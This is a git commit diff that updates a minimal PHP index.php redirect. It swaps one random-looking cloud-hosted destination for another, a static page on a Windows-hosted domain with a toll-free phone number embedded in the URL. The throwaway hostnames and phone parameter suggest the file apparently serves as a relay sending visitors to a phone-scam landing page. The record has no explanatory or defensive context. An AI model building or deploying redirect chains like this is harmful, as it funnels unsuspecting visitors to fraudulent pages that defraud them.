12236f500ef24276dbe7212955da0e689bee7cfa
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-05-29 19:00:53 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location: https://f35grtdvgetyjtkhjghfgferetrhyyik-ysnsc.ondigitalocean.app/");
+header("Location: https://4efefvgdfg3erg45rgerferf.z5.web.core.windows.net/index.html?Aniph=1-888-329-4110");
 
 exit;
 ?>
